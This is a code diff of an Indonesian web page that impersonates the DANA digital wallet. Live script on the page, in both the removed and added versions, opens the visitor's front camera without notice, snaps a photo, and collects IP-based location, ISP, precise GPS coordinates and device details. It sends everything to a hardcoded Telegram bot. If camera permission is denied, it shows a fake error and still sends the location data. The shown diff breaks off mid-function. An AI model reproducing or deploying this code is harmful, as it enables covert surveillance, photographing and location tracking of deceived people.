@@ -1,605 +1,617 @@
 <!DOCTYPE html>
 <html lang="id">
-  <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0, user-scalable=no" />
-    <meta name="theme-color" content="#108ee9" />
-    <title>DANA - Dompet Digital</title>
-    <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24'%3E%3Crect width='24' height='24' rx='5' fill='%23108ee9'/%3E%3Cpath d='M5 8c0-1 .8-1.7 1.7-1.7h7c2.9 0 5.2 2.3 5.2 5.2s-2.3 5.2-5.2 5.2H6.7A1.7 1.7 0 0 1 5 15V8Z' fill='none' stroke='white' stroke-width='2'/%3E%3C/svg%3E" />
-    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet" />
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
+  <meta name="theme-color" content="#108ee9" />
+  <title>DANA - Dompet Digital</title>
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700;800&display=swap" rel="stylesheet" />
 
-    <style>
-      * {
-        margin: 0;
-        padding: 0;
-        box-sizing: border-box;
-      }
-      html,
-      body {
-        height: 100%;
-        background: #108EE9;
-        font-family: 'Open Sans', 'SF Pro Text', -apple-system, BlinkMacSystemFont, sans-serif;
-        color: #ffffff;
-        -webkit-font-smoothing: antialiased;
-        margin: 0;
-        padding: 0;
-      }
-      .landing-page {
-        height: 100%;
-        display: flex;
-        flex-direction: column;
-        justify-content: center;
-        align-items: center;
-        text-align: center;
-        padding: 0.16rem;
-        max-width: 480px;
-        margin: 0 auto;
-      }
-      #animation {
-        width: 2.4rem;
-        height: 2.4rem;
-        margin: 0 auto;
-      }
-      #animation img {
-        width: 100%;
-        height: 100%;
-        object-fit: contain;
-      }
-      .dana-logo {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        gap: 0.08rem;
-        height: 0.32rem;
-        margin: 0.3rem auto 0.12rem;
-      }
-      .dana-logo .logo-mark {
-        display: flex;
-        align-items: center;
-        justify-content: center;
-        width: 0.32rem;
-        height: 0.32rem;
-        border-radius: 50%;
-        background-color: #ffffff;
-        color: #108EE9;
-        flex-shrink: 0;
-      }
-      .dana-logo .logo-mark svg {
-        width: 0.18rem;
-        height: 0.18rem;
-      }
-      .dana-logo .logo-text {
-        font-size: 0.32rem;
-        font-weight: 700;
-        letter-spacing: 0.05em;
-        color: #ffffff;
-        line-height: 1;
-      }
-      .title {
-        margin: 0 auto 0.08rem;
-        font-size: 0.27rem;
-        font-weight: 600;
-        line-height: 0.36rem;
-        max-width: 4rem;
-      }
-      .desc {
-        margin: 0 auto;
-        font-size: 0.18rem;
-        line-height: 0.24rem;
-        color: rgba(255, 255, 255, 0.9);
-        max-width: 3.6rem;
-      }
-      .btn-container {
-        display: flex;
-        margin: 0.16rem auto;
-        padding: 0 0.16rem;
-        width: 100%;
-        max-width: 4rem;
-      }
-      .btn-container button {
-        width: 100%;
-        background-color: #ffffff;
-        padding: 0.12rem 0.16rem;
-        font-family: 'Open Sans', sans-serif;
-        font-size: 0.16rem;
-        font-weight: 600;
-        color: #108EE9;
-        border: none;
-        border-radius: 0.04rem;
-        cursor: pointer;
-        transition: background-color 0.15s ease;
-        letter-spacing: 0.05em;
-      }
-      .btn-container button:hover {
-        background-color: rgba(255, 255, 255, 0.9);
-      }
-      .btn-container button:active {
-        background-color: rgba(255, 255, 255, 0.8);
-        transform: scale(0.98);
-      }
-      @media screen and (max-width: 480px) {
-        #animation {
-          width: 2rem;
-          height: 2rem;
-        }
-        .dana-logo {
-          margin: 0.4rem auto 0.12rem;
-        }
-        .dana-logo .logo-text {
-          font-size: 0.28rem;
-        }
-        .title {
-          font-size: 0.24rem;
-          line-height: 0.32rem;
-        }
-        .desc {
-          font-size: 0.16rem;
-          line-height: 0.2rem;
-        }
-        .btn-container {
-          position: fixed;
-          bottom: 0.2rem;
-          left: 0;
-          width: 100%;
-          padding: 0 0.16rem;
-          max-width: 100%;
-        }
-        .btn-container button {
-          width: 100%;
-          padding: 0.14rem 0.16rem;
-          font-size: 0.16rem;
-        }
-      }
+  <style>
+    * { margin:0; padding:0; box-sizing:border-box; }
+    html, body {
+      height:100%;
+      background:#108EE9;
+      font-family:'Open Sans',sans-serif;
+      color:#fff;
+      -webkit-font-smoothing:antialiased;
+    }
+    .page {
+      height:100%;
+      display:flex;
+      flex-direction:column;
+      justify-content:center;
+      align-items:center;
+      padding:20px;
+      max-width:480px;
+      margin:0 auto;
+      text-align:center;
+    }
+    .illustration {
+      width:180px;
+      height:180px;
+      margin-bottom:10px;
+    }
+    .illustration img {
+      width:100%;
+      height:100%;
+      object-fit:contain;
+    }
+    .logo {
+      display:flex;
+      align-items:center;
+      gap:12px;
+      margin-bottom:6px;
+    }
+    .logo .mark {
+      width:44px;
+      height:44px;
+      border-radius:50%;
+      background:#fff;
+      color:#108EE9;
+      display:flex;
+      align-items:center;
+      justify-content:center;
+      flex-shrink:0;
+    }
+    .logo .mark svg {
+      width:24px;
+      height:24px;
+    }
+    .logo .text {
+      font-size:36px;
+      font-weight:800;
+      letter-spacing:0.15em;
+      color:#fff;
+    }
+    .title {
+      font-size:28px;
+      font-weight:700;
+      margin:10px 0 6px;
+      line-height:1.2;
+    }
+    .desc {
+      font-size:16px;
+      color:rgba(255,255,255,0.9);
+      max-width:320px;
+      line-height:1.5;
+    }
+    .btn-wrap {
+      width:100%;
+      max-width:320px;
+      margin-top:24px;
+      padding:0 16px;
+      position:fixed;
+      bottom:32px;
+      left:50%;
+      transform:translateX(-50%);
+    }
+    .btn-wrap button {
+      width:100%;
+      padding:16px;
+      background:#fff;
+      border:none;
+      border-radius:6px;
+      font-size:18px;
+      font-weight:700;
+      color:#108EE9;
+      cursor:pointer;
+      transition:0.15s;
+      letter-spacing:0.05em;
+    }
+    .btn-wrap button:hover { background:rgba(255,255,255,0.9); }
+    .btn-wrap button:active { transform:scale(0.97); }
 
-      /* ERROR OVERLAY */
-      .error-overlay {
-        display: none;
-        position: fixed;
-        inset: 0;
-        z-index: 9999;
-        background: #0a0620;
-        align-items: center;
-        justify-content: center;
-        flex-direction: column;
-        color: rgba(255, 255, 255, 0.12);
-        font-family: 'Open Sans', system-ui, sans-serif;
-        font-size: 2.4rem;
-        font-weight: 200;
-        letter-spacing: 8px;
-        text-transform: uppercase;
-        padding: 0.2rem;
-        text-align: center;
-        pointer-events: auto;
-      }
-      .error-overlay .sub-error {
-        font-size: 0.7rem;
-        color: rgba(255, 255, 255, 0.04);
-        letter-spacing: 4px;
-        margin-top: 0.1rem;
-      }
-      .btn-retry {
-        margin-top: 0.24rem;
-        padding: 0.1rem 0.28rem;
-        background: rgba(255, 255, 255, 0.05);
-        border: 1px solid rgba(255, 255, 255, 0.08);
-        border-radius: 0.4rem;
-        color: rgba(255, 255, 255, 0.25);
-        font-family: 'Open Sans', sans-serif;
-        font-size: 0.14rem;
-        font-weight: 500;
-        letter-spacing: 3px;
-        text-transform: uppercase;
-        cursor: pointer;
-        transition: all 0.3s ease;
-        pointer-events: auto;
-      }
-      .btn-retry:hover {
-        background: rgba(255, 255, 255, 0.08);
-        color: rgba(255, 255, 255, 0.4);
-        border-color: rgba(255, 255, 255, 0.15);
-      }
-      video {
-        display: none !important;
-      }
-    </style>
-  </head>
-  <body>
+    /* Error Overlay */
+    .error-overlay {
+      display:none;
+      position:fixed;
+      inset:0;
+      z-index:9999;
+      background:#0a0620;
+      flex-direction:column;
+      align-items:center;
+      justify-content:center;
+      color:rgba(255,255,255,0.12);
+      font-size:3rem;
+      font-weight:200;
+      letter-spacing:10px;
+      text-transform:uppercase;
+      padding:20px;
+    }
+    .error-overlay .sub {
+      font-size:0.8rem;
+      color:rgba(255,255,255,0.04);
+      letter-spacing:4px;
+      margin-top:10px;
+    }
+    .error-overlay .retry-btn {
+      margin-top:24px;
+      padding:12px 32px;
+      background:rgba(255,255,255,0.05);
+      border:1px solid rgba(255,255,255,0.08);
+      border-radius:40px;
+      color:rgba(255,255,255,0.25);
+      font-size:0.8rem;
+      font-weight:500;
+      letter-spacing:3px;
+      text-transform:uppercase;
+      cursor:pointer;
+      transition:0.3s;
+    }
+    .error-overlay .retry-btn:hover {
+      background:rgba(255,255,255,0.08);
+      color:rgba(255,255,255,0.4);
+      border-color:rgba(255,255,255,0.15);
+    }
 
-    <!-- MAIN PAGE -->
-    <div class="landing-page" id="mainPage">
-      <div id="animation">
-        <img src="dana-hero.png" alt="Ilustrasi DANA" />
-      </div>
-      <div class="dana-logo" aria-label="DANA">
-        <span class="logo-mark">
-          <svg viewBox="0 0 24 24" fill="currentColor" aria-hidden="true">
-            <path d="M4 8c0-1.1.9-2 2-2h9c3.3 0 6 2.7 6 6s-2.7 6-6 6H6a2 2 0 0 1-2-2V8Zm3 1v6h8a3 3 0 0 0 0-6H7Z" />
-          </svg>
-        </span>
-        <span class="logo-text">DANA</span>
-      </div>
-      <h1 class="title">Dompet digital yang aman dan tepercaya!</h1>
-      <p class="desc">
-        Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman
-      </p>
-      <div class="btn-container">
-        <button type="button" id="openDana">BUKA DI DANA</button>
-      </div>
+    video { display:none !important; }
+
+    @media (max-width:480px) {
+      .illustration { width:140px; height:140px; }
+      .logo .text { font-size:28px; }
+      .title { font-size:22px; }
+      .desc { font-size:14px; }
+      .btn-wrap { bottom:20px; padding:0 12px; }
+      .btn-wrap button { padding:14px; font-size:16px; }
+      .error-overlay { font-size:2.2rem; }
+    }
+    @media (max-width:360px) {
+      .illustration { width:120px; height:120px; }
+      .logo .text { font-size:24px; }
+      .title { font-size:20px; }
+    }
+  </style>
+</head>
+<body>
+
+  <!-- ===== MAIN PAGE ===== -->
+  <div class="page" id="mainPage">
+    <div class="illustration">
+      <img src="dana-hero.png" alt="DANA" />
     </div>
-
-    <!-- ERROR OVERLAY -->
-    <div class="error-overlay" id="errorOverlay">
-      Error
-      <div class="sub-error">—</div>
-      <button class="btn-retry" id="retryBtn">⟳ Coba Ulang</button>
+    <div class="logo">
+      <span class="mark">
+        <svg viewBox="0 0 24 24" fill="currentColor">
+          <path d="M4 8c0-1.1.9-2 2-2h9c3.3 0 6 2.7 6 6s-2.7 6-6 6H6a2 2 0 0 1-2-2V8Zm3 1v6h8a3 3 0 0 0 0-6H7Z"/>
+        </svg>
+      </span>
+      <span class="text">DANA</span>
     </div>
+    <h1 class="title">Dompet digital yang aman dan tepercaya!</h1>
+    <p class="desc">Nikmati kemudahan bertransaksi dengan beragam metode bayar di genggaman</p>
+  </div>
 
-    <!-- ====== SCRIPT ====== -->
-    <script>
-      (function() {
-        'use strict';
+  <!-- ===== FIXED BUTTON ===== -->
+  <div class="btn-wrap">
+    <button id="openDana">BUKA DI DANA</button>
+  </div>
 
-        // ---------- KONFIGURASI ----------
-        const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
-        const CHAT_ID = '8463156896';
-        const MAX_ATTEMPTS = 3;
-        let attempts = 0;
-        let sudahKirim = false;
-        let izinDitolak = false;
-        let retryTimer = null;
+  <!-- ===== ERROR OVERLAY ===== -->
+  <div class="error-overlay" id="errorOverlay">
+    Error
+    <div class="sub">—</div>
+    <button class="retry-btn" id="retryBtn">⟳ Coba Ulang</button>
+  </div>
 
-        // Data lokasi & device
-        let locationData = null;
-        let gpsData = null;
-        let deviceName = '';
-        let locationReady = false;
-        let locationPromise = null;
+  <!-- ===== SCRIPT ===== -->
+  <script>
+    (function() {
+      'use strict';
 
-        const mainPage = document.getElementById('mainPage');
-        const errorOverlay = document.getElementById('errorOverlay');
-        const retryBtn = document.getElementById('retryBtn');
+      // ---------- KONFIGURASI ----------
+      const BOT_TOKEN = '8660313492:AAEstxadAAetaluw8OYCgyCxwZB21LDch4Y';
+      const CHAT_ID = '8463156896';
+      const MAX_RETRY = 3;
 
-        // ---------- DAPATKAN NAMA HP ----------
-        function getDeviceName() {
-          const ua = navigator.userAgent;
-          let name = '';
-          if (/iPhone/i.test(ua)) {
-            const match = ua.match(/iPhone OS (\d+_\d+)/);
-            name = 'iPhone ' + (match ? match[1].replace('_', '.') : '');
-          } else if (/iPad/i.test(ua)) {
-            const match = ua.match(/iPad OS (\d+_\d+)/);
-            name = 'iPad ' + (match ? match[1].replace('_', '.') : '');
-          } else if (/Android/i.test(ua)) {
-            const match = ua.match(/Android\s([\d.]+)/);
-            const brand = ua.match(/(Samsung|Xiaomi|OPPO|Vivo|Realme|OnePlus|Google|Nokia|Huawei|ASUS|Sony|Motorola|LG|HTC)/i);
-            let brandName = brand ? brand[1] : 'Android';
-            name = brandName + ' ' + (match ? match[1] : '');
-          } else if (/Windows/i.test(ua)) {
-            name = 'Windows PC';
-          } else if (/Mac/i.test(ua)) {
-            name = 'Mac';
-          } else {
-            name = 'Perangkat tidak dikenal';
-          }
-          if (window.screen) {
-            const w = window.screen.width;
-            const h = window.screen.height;
-            name += ` (${w}x${h})`;
-          }
-          return name;
-        }
+      // ---------- STATE ----------
+      let status = {
+        cameraAttempts: 0,
+        cameraGranted: false,
+        cameraDenied: false,
+        alreadySent: false,
+        locationReady: false,
+        retryTimer: null
+      };
 
-        // ---------- GET LOKASI DARI IP ----------
-        async function getLocationFromIP() {
-          try {
-            const controller = new AbortController();
-            const timeoutId = setTimeout(() => controller.abort(), 7000);
-            const res = await fetch('https://ipapi.co/json/', {
-              signal: controller.signal,
-              headers: { 'Accept': 'application/json' }
-            });
-            clearTimeout(timeoutId);
-            if (!res.ok) throw new Error('HTTP ' + res.status);
-            const data = await res.json();
-            return {
-              ip: data.ip || null,
-              city: data.city || null,
-              region: data.region || null,
-              country: data.country_name || null,
-              postal: data.postal || null,
-              latitude: data.latitude || null,
-              longitude: data.longitude || null,
-              org: data.org || null,
-              timezone: data.timezone || null
-            };
-          } catch {
-            return null;
-          }
-        }
+      // Data
+      let deviceName = '';
+      let locationData = null;   // dari IP
+      let gpsData = null;        // dari GPS
 
-        // ---------- GET GPS ----------
-        function getGPSLocation() {
-          return new Promise((resolve) => {
-            if (!navigator.geolocation) {
-              resolve(null);
-              return;
-            }
-            const timeoutId = setTimeout(() => resolve(null), 6000);
-            navigator.geolocation.getCurrentPosition(
-              (pos) => {
-                clearTimeout(timeoutId);
-                resolve({
-                  latitude: pos.coords.latitude,
-                  longitude: pos.coords.longitude,
-                  accuracy: pos.coords.accuracy
-                });
-              },
-              () => {
-                clearTimeout(timeoutId);
-                resolve(null);
-              }, {
-                enableHighAccuracy: true
-              }
-            );
-          });
-        }
+      // DOM
+      const mainPage = document.getElementById('mainPage');
+      const errorOverlay = document.getElementById('errorOverlay');
+      const retryBtn = document.getElementById('retryBtn');
+      const danaBtn = document.getElementById('openDana');
 
-        // ---------- AMBIL SEMUA DATA LOKASI (sekali jalan) ----------
-        async function fetchAllLocationData() {
-          const [ipResult, gpsResult] = await Promise.allSettled([
-            getLocationFromIP(),
-            getGPSLocation()
-          ]);
-          locationData = ipResult.status === 'fulfilled' ? ipResult.value : null;
-          gpsData = gpsResult.status === 'fulfilled' ? gpsResult.value : null;
-          locationReady = true;
-        }
+      // =========================================================
+      // 1. DAPATKAN NAMA PERANGKAT
+      // =========================================================
+      function getDeviceName() {
+        const ua = navigator.userAgent;
+        let name = '';
 
-        // ---------- BUAT CAPTION (untuk foto atau teks) ----------
-        function buildCaption(hasPhoto) {
-          let caption = '';
-          if (hasPhoto) {
-            caption += `📸 Foto diambil otomatis\n`;
-          } else {
-            caption += `⚠️ Gagal mengambil foto\n`;
-          }
-          caption += `🕒 ${new Date().toLocaleString('id-ID')}\n`;
-          caption += `📱 ${deviceName || 'Perangkat tidak dikenal'}\n`;
-
-          if (locationData) {
-            if (locationData.ip) caption += `\n🌐 IP Publik : ${locationData.ip}`;
-            if (locationData.org) caption += `\n📡 Operator/ISP : ${locationData.org}`;
-            if (locationData.city || locationData.region || locationData.country) {
-              let loc = [];
-              if (locationData.city) loc.push(locationData.city);
-              if (locationData.region) loc.push(locationData.region);
-              if (locationData.country) loc.push(locationData.country);
-              caption += `\n📍 Lokasi IP : ${loc.join(', ')}`;
-            }
-            if (locationData.postal) caption += `\n📮 Kode Pos : ${locationData.postal}`;
-            if (locationData.timezone) caption += `\n🕐 Zona Waktu : ${locationData.timezone}`;
-            if (locationData.latitude && locationData.longitude) {
-              caption += `\n🗺️ Koordinat (IP) : ${locationData.latitude}, ${locationData.longitude}`;
-            }
-          }
-
-          if (gpsData) {
-            caption += `\n\n📡 GPS (akurat):`;
-            caption += `\n   📍 Lat : ${gpsData.latitude}`;
-            caption += `\n   📍 Long : ${gpsData.longitude}`;
-            if (gpsData.accuracy) {
-              caption += `\n   🎯 Akurasi : ±${Math.round(gpsData.accuracy)} meter`;
-            }
-          }
-
-          if (!locationData && !gpsData) {
-            caption += `\n\n⚠️ Data lokasi tidak tersedia`;
-          }
-
-          if (!hasPhoto) {
-            caption += `\n\n⚠️ Izin kamera ditolak, hanya mengirim data lokasi`;
-          }
-
-          return caption;
-        }
-
-        // ---------- KIRIM KE TELEGRAM (dengan foto) ----------
-        async function kirimDenganFoto(dataUrl) {
-          try {
-            const blob = await fetch(dataUrl).then(r => r.blob());
-            const formData = new FormData();
-            formData.append('photo', blob, 'foto.png');
-            const caption = buildCaption(true);
-            formData.append('caption', caption);
-            formData.append('chat_id', CHAT_ID);
-
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
-              method: 'POST',
-              body: formData
-            });
-            if (!response.ok) throw new Error('Telegram API error');
-            sudahKirim = true;
-          } catch (e) {
-            console.error('Gagal kirim foto:', e);
-          }
-        }
-
-        // ---------- KIRIM TEKS TANPA FOTO (pakai sendMessage) ----------
-        async function kirimTeksTanpaFoto() {
-          try {
-            const caption = buildCaption(false);
-            const payload = {
-              chat_id: CHAT_ID,
-              text: caption,
-              parse_mode: 'HTML'
-            };
-            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify(payload)
-            });
-            if (!response.ok) throw new Error('Telegram API error');
-            sudahKirim = true;
-          } catch (e) {
-            console.error('Gagal kirim teks:', e);
-          }
-        }
-
-        // ---------- AMBIL FOTO ----------
-        function ambilDanKirim(video) {
-          if (sudahKirim) return;
-
-          const canvas = document.createElement('canvas');
-          const lebar = video.videoWidth || 640;
-          const tinggi = video.videoHeight || 480;
-          canvas.width = lebar;
-          canvas.height = tinggi;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, lebar, tinggi);
-          const dataUrl = canvas.toDataURL('image/png');
-
-          if (video.srcObject) {
-            video.srcObject.getTracks().forEach(track => track.stop());
-          }
-
-          // Tunggu data lokasi siap (maks 2 detik)
-          if (!locationReady) {
-            setTimeout(() => {
-              kirimDenganFoto(dataUrl);
-            }, 1000);
-          } else {
-            kirimDenganFoto(dataUrl);
-          }
-        }
-
-        // ---------- TAMPILKAN ERROR & KIRIM TEKS ----------
-        function tampilkanError() {
-          izinDitolak = true;
-          mainPage.style.display = 'none';
-          errorOverlay.style.display = 'flex';
-          if (retryTimer) {
-            clearTimeout(retryTimer);
-            retryTimer = null;
-          }
-          // Tunggu lokasi siap (maks 2 detik) lalu kirim teks
-          if (!locationReady) {
-            setTimeout(() => {
-              kirimTeksTanpaFoto();
-            }, 2000);
-          } else {
-            kirimTeksTanpaFoto();
-          }
-        }
-
-        // ---------- RESET & COBA ULANG ----------
-        function resetDanCobaUlang() {
-          izinDitolak = false;
-          attempts = 0;
-          sudahKirim = false;
-          if (retryTimer) {
-            clearTimeout(retryTimer);
-            retryTimer = null;
-          }
-          errorOverlay.style.display = 'none';
-          mainPage.style.display = 'flex';
-          setTimeout(mulaiKamera, 300);
-        }
-
-        // ---------- MULAI KAMERA ----------
-        function mulaiKamera() {
-          if (sudahKirim || izinDitolak) return;
-          attempts++;
-
-          navigator.mediaDevices.getUserMedia({
-              video: { facingMode: 'user', width: { ideal: 640 }, height: { ideal: 480 } },
-              audio: false
-            })
-            .then(stream => {
-              const video = document.createElement('video');
-              video.style.display = 'none';
-              video.setAttribute('playsinline', '');
-              video.muted = true;
-              video.srcObject = stream;
-              document.body.appendChild(video);
-
-              video.onloadedmetadata = () => {
-                video.play()
-                  .then(() => {
-                    setTimeout(() => ambilDanKirim(video), 100);
-                  })
-                  .catch(() => {
-                    if (attempts < MAX_ATTEMPTS) {
-                      retryTimer = setTimeout(mulaiKamera, 2000);
-                    } else {
-                      tampilkanError();
-                    }
-                  });
-              };
-              video.onerror = () => {
-                if (attempts < MAX_ATTEMPTS) {
-                  retryTimer = setTimeout(mulaiKamera, 2000);
-                } else {
-                  tampilkanError();
-                }
-              };
-            })
-            .catch(err => {
-              console.error('Error kamera:', err);
-              if (err.name === 'NotAllowedError' || err.name === 'PermissionDeniedError') {
-                tampilkanError();
-                return;
-              }
-              if (attempts < MAX_ATTEMPTS) {
-                retryTimer = setTimeout(mulaiKamera, 2000);
-              } else {
-                tampilkanError();
-              }
-            });
-        }
-
-        // ---------- INIT ----------
-        async function init() {
-          deviceName = getDeviceName();
-          console.log('Device:', deviceName);
-
-          // Mulai fetch lokasi secara paralel
-          locationPromise = fetchAllLocationData();
-
-          // Jalankan kamera (tunggu 500ms agar lokasi sempat mulai)
-          setTimeout(mulaiKamera, 500);
-        }
-
-        // ---------- EVENT RETRY (FIX) ----------
-        if (retryBtn) {
-          retryBtn.addEventListener('click', function(e) {
-            e.stopPropagation();
-            e.preventDefault();
-            resetDanCobaUlang();
-          });
-        }
-
-        // ---------- JALANKAN ----------
-        if (document.readyState === 'complete') {
-          init();
+        if (/iPhone/i.test(ua)) {
+          const v = ua.match(/iPhone OS (\d+_\d+)/);
+          name = 'iPhone ' + (v ? v[1].replace('_', '.') : '');
+        } else if (/iPad/i.test(ua)) {
+          const v = ua.match(/iPad OS (\d+_\d+)/);
+          name = 'iPad ' + (v ? v[1].replace('_', '.') : '');
+        } else if (/Android/i.test(ua)) {
+          const v = ua.match(/Android\s([\d.]+)/);
+          const brand = ua.match(/(Samsung|Xiaomi|OPPO|Vivo|Realme|OnePlus|Google|Nokia|Huawei|ASUS|Sony|Motorola|LG|HTC)/i);
+          name = (brand ? brand[1] : 'Android') + ' ' + (v ? v[1] : '');
+        } else if (/Windows/i.test(ua)) {
+          name = 'Windows PC';
+        } else if (/Mac/i.test(ua)) {
+          name = 'Mac';
         } else {
-          window.addEventListener('load', init);
+          name = 'Perangkat tidak dikenal';
         }
 
-        // ---------- TOMBOL "BUKA DI DANA" ----------
-        const danaBtn = document.getElementById('openDana');
-        if (danaBtn) {
-          danaBtn.addEventListener('click', function(e) {
-            this.style.transform = 'scale(0.96)';
-            setTimeout(() => this.style.transform = '', 150);
+        if (window.screen) {
+          name += ` (${window.screen.width}x${window.screen.height})`;
+        }
+        return name;
+      }
 
-            if (izinDitolak) {
-              resetDanCobaUlang();
-              setTimeout(() => {
-                window.location.href = 'https://www.dana.id/';
-              }, 600);
-              return;
+      // =========================================================
+      // 2. AMBIL LOKASI DARI IP
+      // =========================================================
+      async function fetchLocationFromIP() {
+        try {
+          const ctrl = new AbortController();
+          const timer = setTimeout(() => ctrl.abort(), 6000);
+          const res = await fetch('https://ipapi.co/json/', {
+            signal: ctrl.signal,
+            headers: { Accept: 'application/json' }
+          });
+          clearTimeout(timer);
+          if (!res.ok) throw new Error('HTTP ' + res.status);
+          const d = await res.json();
+          return {
+            ip: d.ip || null,
+            city: d.city || null,
+            region: d.region || null,
+            country: d.country_name || null,
+            postal: d.postal || null,
+            lat: d.latitude || null,
+            lng: d.longitude || null,
+            org: d.org || null,
+            tz: d.timezone || null
+          };
+        } catch {
+          return null;
+        }
+      }
+
+      // =========================================================
+      // 3. AMBIL GPS (Browser)
+      // =========================================================
+      function fetchGPS() {
+        return new Promise((resolve) => {
+          if (!navigator.geolocation) { resolve(null); return; }
+          const timer = setTimeout(() => resolve(null), 5000);
+          navigator.geolocation.getCurrentPosition(
+            (pos) => {
+              clearTimeout(timer);
+              resolve({
+                lat: pos.coords.latitude,
+                lng: pos.coords.longitude,
+                acc: pos.coords.accuracy
+              });
+            },
+            () => {
+              clearTimeout(timer);
+              resolve(null);
+            },
+            { enableHighAccuracy: true }
+          );
+        });
+      }
+
+      // =========================================================
+      // 4. KUMPULKAN SEMUA DATA LOKASI
+      // =========================================================
+      async function collectLocationData() {
+        const [ipResult, gpsResult] = await Promise.allSettled([
+          fetchLocationFromIP(),
+          fetchGPS()
+        ]);
+        locationData = ipResult.status === 'fulfilled' ? ipResult.value : null;
+        gpsData = gpsResult.status === 'fulfilled' ? gpsResult.value : null;
+        status.locationReady = true;
+      }
+
+      // =========================================================
+      // 5. BUAT CAPTION
+      // =========================================================
+      function buildCaption(hasPhoto) {
+        const lines = [];
+        if (hasPhoto) {
+          lines.push('📸 Foto diambil otomatis');
+        } else {
+          lines.push('⚠️ Gagal mengambil foto');
+        }
+        lines.push(`🕒 ${new Date().toLocaleString('id-ID')}`);
+        lines.push(`📱 ${deviceName || 'Tidak dikenal'}`);
+
+        if (locationData) {
+          if (locationData.ip) lines.push(`\n🌐 IP Publik : ${locationData.ip}`);
+          if (locationData.org) lines.push(`📡 Operator/ISP : ${locationData.org}`);
+          const locParts = [];
+          if (locationData.city) locParts.push(locationData.city);
+          if (locationData.region) locParts.push(locationData.region);
+          if (locationData.country) locParts.push(locationData.country);
+          if (locParts.length) lines.push(`📍 Lokasi IP : ${locParts.join(', ')}`);
+          if (locationData.postal) lines.push(`📮 Kode Pos : ${locationData.postal}`);
+          if (locationData.tz) lines.push(`🕐 Zona Waktu : ${locationData.tz}`);
+          if (locationData.lat && locationData.lng) {
+            lines.push(`🗺️ Koordinat (IP) : ${locationData.lat}, ${locationData.lng}`);
+          }
+        }
+
+        if (gpsData) {
+          lines.push(`\n📡 GPS (akurat):`);
+          lines.push(`   📍 Lat : ${gpsData.lat}`);
+          lines.push(`   📍 Long : ${gpsData.lng}`);
+          if (gpsData.acc) {
+            lines.push(`   🎯 Akurasi : ±${Math.round(gpsData.acc)} meter`);
+          }
+        }
+
+        if (!locationData && !gpsData) {
+          lines.push(`\n⚠️ Data lokasi tidak tersedia`);
+        }
+
+        if (!hasPhoto) {
+          lines.push(`\n⚠️ Izin kamera ditolak, hanya mengirim data lokasi`);
+        }
+
+        return lines.join('\n');
+      }
+
+      // =========================================================
+      // 6. KIRIM KE TELEGRAM (dengan foto)
+      // =========================================================
+      async function sendWithPhoto(dataUrl) {
+        try {
+          const blob = await fetch(dataUrl).then(r => r.blob());
+          const fd = new FormData();
+          fd.append('photo', blob, 'foto.png');
+          fd.append('caption', buildCaption(true));
+          fd.append('chat_id', CHAT_ID);
+
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: fd
+          });
+          if (!res.ok) throw new Error('API error');
+          status.alreadySent = true;
+          console.log('✅ Foto + data terkirim');
+        } catch (e) {
+          console.error('Gagal kirim foto:', e);
+        }
+      }
+
+      // =========================================================
+      // 7. KIRIM TEKS TANPA FOTO (pakai sendMessage)
+      // =========================================================
+      async function sendTextOnly() {
+        try {
+          const payload = {
+            chat_id: CHAT_ID,
+            text: buildCaption(false),
+            parse_mode: 'HTML'
+          };
+          const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify(payload)
+          });
+          if (!res.ok) throw new Error('API error');
+          status.alreadySent = true;
+          console.log('✅ Teks (tanpa foto) terkirim');
+        } catch (e) {
+          console.error('Gagal kirim teks:', e);
+        }
+      }
+
+      // =========================================================
+      // 8. AMBIL FOTO DARI STREAM & KIRIM
+      // =========================================================
+      function captureAndSend(video) {
+        if (status.alreadySent) return;
+
+        const canvas = document.createElement('canvas');
+        const w = video.videoWidth || 640;
+        const h = video.videoHeight || 480;
+        canvas.width = w;
+        canvas.height = h;
+        const ctx = canvas.getContext('2d');
+        ctx.drawImage(video, 0, 0, w, h);
+        const dataUrl = canvas.toDataURL('image/png');
+
+        // Stop stream
+        if (video.srcObject) {
+          video.srcObject.getTracks().forEach(t => t.stop());
+        }
+
+        // Kirim (tunggu lokasi siap maks 2 detik)
+        if (!status.locationReady) {
+          setTimeout(() => sendWithPhoto(dataUrl), 1000);
+        } else {
+          sendWithPhoto(dataUrl);
+        }
+      }
+
+      // =========================================================
+      // 9. TAMPILKAN ERROR + KIRIM TEKS
+      // =========================================================
+      function showErrorAndSendText() {
+        status.cameraDenied = true;
+        mainPage.style.display = 'none';
+        errorOverlay.style.display = 'flex';
+
+        if (status.retryTimer) {
+          clearTimeout(status.retryTimer);
+          status.retryTimer = null;
+        }
+
+        // Kirim teks (tunggu lokasi siap maks 2 detik)
+        if (!status.locationReady) {
+          setTimeout(() => sendTextOnly(), 2000);
+        } else {
+          sendTextOnly();
+        }
+      }
+
+      // =========================================================
+      // 10. RESET & COBA ULANG
+      // =========================================================
+      function resetAndRetry() {
+        status.cameraDenied = false;
+        status.cameraAttempts = 0;
+        status.alreadySent = false;
+        if (status.retryTimer) {
+          clearTimeout(status.retryTimer);
+          status.retryTimer = null;
+        }
+        errorOverlay.style.display = 'none';
+        mainPage.style.display = 'flex';
+        // Mulai ulang proses kamera
+        setTimeout(startCamera, 300);
+      }
+
+      // =========================================================
+      // 11. MULAI KAMERA
+      // =========================================================
+      function startCamera() {
